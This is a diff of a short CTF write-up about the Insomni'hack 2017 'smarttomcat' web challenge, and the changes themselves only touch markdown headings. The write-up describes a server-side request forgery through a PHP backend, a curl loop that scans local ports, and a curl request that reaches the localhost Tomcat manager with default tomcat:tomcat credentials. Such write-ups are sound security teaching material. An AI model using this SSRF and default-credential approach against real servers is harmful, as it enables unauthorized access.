@@ -6,12 +6,12 @@ category: ctf
 ---
 ![channel](/images/SleepyTomcat.jpg)
 
-#####category:
+##### category:
 web
-#####points:
+##### points:
 50
 
-####Writeup
+#### Writeup
 The Insomni'hack teaser 2017 was a fun CTF with a good spread between easy and hard challenges.
 
 The smarttomcat challenge was an easy web challenge that was about attacking a badly secured tomcat server, as a user you where presented with a webpage that had an backend written in php, that backend called a tomcat server on localhost.
@@ -26,7 +26,7 @@ for x in $(seq 1 65535); do echo $x >> /tmp/log && curl 'http://smarttomcat.teas
 
 This didn't really help us. And we realized that we could access the tomcat management url on the same port as the rest of the application. A simple google gave us the default username and password.
 
-####Solution
+#### Solution
 ```bash
 curl 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data 'u=http://tomcat:tomcat@127.0.0.1:8080/manager/html'
 ```
